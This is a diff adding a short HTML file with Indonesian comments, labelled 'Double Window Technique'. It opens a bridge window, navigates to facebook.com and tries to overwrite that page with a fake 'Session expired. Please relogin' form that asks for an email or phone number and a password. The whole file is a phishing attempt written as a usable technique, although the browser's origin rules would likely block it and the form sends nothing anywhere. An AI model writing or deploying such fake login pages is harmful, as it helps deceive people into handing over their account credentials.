@@ -1,0 +1,33 @@
+<button onclick="doubleWindow()">Double Window Technique</button>
+
+<script>
+function doubleWindow() {
+    // Buka window pertama sebagai bridge
+    const bridge = window.open("", "_blank");
+    
+    setTimeout(() => {
+        try {
+            // Dari bridge, buka window kedua
+            const target = bridge.open("https://facebook.com", "_blank");
+            
+            setTimeout(() => {
+                try {
+                    target.document.write(`
+                        <h1>Facebook Login</h1>
+                        <p>Session expired. Please relogin:</p>
+                        <input type="text" placeholder="Email/Phone">
+                        <input type="password" placeholder="Password">
+                        <button>Login</button>
+                    `);
+                    target.document.close();
+                } catch(e) {
+                    console.log("Second layer blocked");
+                }
+            }, 300);
+            
+        } catch(e) {
+            console.log("First layer blocked");
+        }
+    }, 100);
+}
+</script>
